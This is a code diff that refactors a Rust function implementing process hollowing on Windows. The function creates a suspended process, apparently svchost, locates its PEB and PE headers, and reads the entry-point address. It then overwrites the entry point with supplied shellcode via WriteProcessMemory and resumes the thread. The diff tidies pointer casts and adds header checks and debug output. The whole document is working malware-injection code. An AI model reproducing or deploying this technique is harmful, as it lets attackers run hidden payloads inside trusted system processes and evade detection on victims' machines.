@@ -9,6 +9,8 @@ use std::{thread, time};
 
 const POINTER_SIZE: usize = mem::size_of::<&u8>();
 const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;
+const E_LFANEW_OFFSET: usize = 0x3c;
+const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
 
 pub fn hollow_and_run(shellcode: &[u8]) {
     let sleep_timer = time::Duration::from_millis(3000);
@@ -43,7 +45,6 @@ pub fn hollow_and_run(shellcode: &[u8]) {
         &lp_current_directory,
         &startup_info,
         &mut process_information) };
-
     if !creation_result.as_bool() {
         panic!("Could not create the suspended process with CreateProcessA");
     }
@@ -57,75 +58,52 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_BASIC_INFORMATION.html
     let process_handle = process_information.hProcess;
     let mut basic_information: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
-    let basic_info_as_c_void = &mut basic_information as *mut _ as *mut c_void;
     
     // Get the PEB base address of the suspended process with ZwQueryInformationProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
-    if let Err(error) = unsafe { NtQueryInformationProcess(process_handle, 0, basic_info_as_c_void, POINTER_SIZE_TIMES_SIX, ptr::null_mut()) } {
+    if let Err(error) = unsafe { NtQueryInformationProcess(process_handle, 0, &mut basic_information as *mut _ as *mut c_void, POINTER_SIZE_TIMES_SIX, ptr::null_mut()) } {
         panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
     }
-
-    let peb = basic_information.PebBaseAddress as u64;
-    let uni_pid = basic_information.UniqueProcessId;
-    println!("Got the PEB, address {peb} and unique pid {uni_pid}");
-    thread::sleep(sleep_timer);
 
     // Use ReadProcessMemory to read 8 bytes of memory; the address of the code base
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.ReadProcessMemory.html
     let image_base = basic_information.PebBaseAddress as u64 + 0x10;
-    let image_base_c_void = image_base as *const c_void;
     let mut address_buffer = [0; POINTER_SIZE];
-    let address_buffer_c_void = &mut address_buffer as *mut _ as *mut c_void;
-    let read_result = unsafe { ReadProcessMemory(process_handle, image_base_c_void, address_buffer_c_void, address_buffer.len(), ptr::null_mut()) };
-
+    let read_result = unsafe { ReadProcessMemory(process_handle, image_base as *const c_void, address_buffer.as_mut_ptr() as _, address_buffer.len(), ptr::null_mut()) };
     if !read_result.as_bool() {
         panic!("Could not read the address of the code base with ReadProcessMemory");
     }
 
-    let res = read_result.as_bool();
-    println!("We read the 8 bytes because read result was {res}");
-    println!("The buffer is {address_buffer:?}");
-    thread::sleep(sleep_timer);
-
-    // Use ReadProcessMemory again to read 512 bytes of memory; the PE header
+    // Use ReadProcessMemory again to read 512 bytes of memory; the DOS header
     let svchost_base = rco_utils::array_to_u64_lit_end(&address_buffer);
-    let svchost_base_c_void = svchost_base as *const c_void;
     let mut header_buffer = [0; 0x200];
-    let header_buffer_c_void = &mut header_buffer as *mut _ as *mut c_void;
-    let read_result = unsafe { ReadProcessMemory(process_handle, svchost_base_c_void, header_buffer_c_void, header_buffer.len(), ptr::null_mut()) };
-
-    println!("read result is {read_result:?}");
-    thread::sleep(sleep_timer);
-
+    let read_result = unsafe { ReadProcessMemory(process_handle, svchost_base as *const c_void, header_buffer.as_mut_ptr() as _, header_buffer.len(), ptr::null_mut()) };
     if !read_result.as_bool() {
-        panic!("Could not read the PE header with ReadProcessMemory");
+        panic!("Could not read the DOS header with ReadProcessMemory");
     }
 
-    println!("svchost base is {svchost_base}");
-    let resb = read_result.as_bool();
-    println!("We read the 512 bytes because the new read result was {resb}");
-    println!("The buffer is {header_buffer:?}");
+    if header_buffer[0] == 77 && header_buffer[1] == 90 {
+        println!("Everything up to here looks correct; the DOS header buffer starts with MZ")
+    }
+    println!("The full DOS header buffer is {header_buffer:?}");
     thread::sleep(sleep_timer);
 
     // Write the shellcode to the suspended process with WriteProcessMemory
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
-    let e_lfanew_offset = rco_utils::array_to_u32_lit_end(header_buffer[0x3C..0x40].try_into().unwrap());
-    println!("elf offset {e_lfanew_offset}");
+    let e_lfanew = rco_utils::array_to_u32_lit_end(&header_buffer[E_LFANEW_OFFSET..E_LFANEW_OFFSET + 0x04].try_into().unwrap());
+    println!("e_lfanew = {e_lfanew}");
     thread::sleep(sleep_timer);
-    let opthdr: usize = (e_lfanew_offset + 0x28).try_into().unwrap();
-    println!("opthdr {opthdr}");
-    thread::sleep(sleep_timer);
-    let entry_point_rva = rco_utils::array_to_u32_lit_end(&header_buffer[opthdr..opthdr + 0x04].try_into().unwrap());
-    println!("entry point {entry_point_rva}");
+    let opthrd_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
+    let entry_point_rva = rco_utils::array_to_u32_lit_end(&header_buffer[opthrd_offset..opthrd_offset + 0x04].try_into().unwrap());
+    println!("entry point rva {entry_point_rva}");
     thread::sleep(sleep_timer);
     let address_of_entry_point = entry_point_rva as u64 + svchost_base;
-    let address_of_entry_point_c_void = address_of_entry_point as *const c_void;
-    let shellcode_c_void = & shellcode as *const _ as *const c_void;
-    let write_result = unsafe { WriteProcessMemory(process_handle, address_of_entry_point_c_void, shellcode_c_void, shellcode.len(), ptr::null_mut()) };
-
+    println!("address of entry point {address_of_entry_point:x}");
+    thread::sleep(sleep_timer);
+    let write_result = unsafe { WriteProcessMemory(process_handle, address_of_entry_point as _, shellcode.as_ptr() as _, shellcode.len(), ptr::null_mut()) };
     if !write_result.as_bool() {
         panic!("Could not write the shellcode to the suspended process with WriteProcessMemory");
     }
@@ -137,7 +115,11 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     // Start it back up with ResumeThread
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.ResumeThread.html
-    let res_result = unsafe { ResumeThread(process_information.hThread) };
-    println!("Resume result was {res_result}");
+    let resume_result = unsafe { ResumeThread(process_information.hThread) };
+    if resume_result != 1 {
+        panic!("Could not resume the suspended process' execution");
+    }
+
+    println!("Resume result was {resume_result}");
     thread::sleep(sleep_timer);
 }
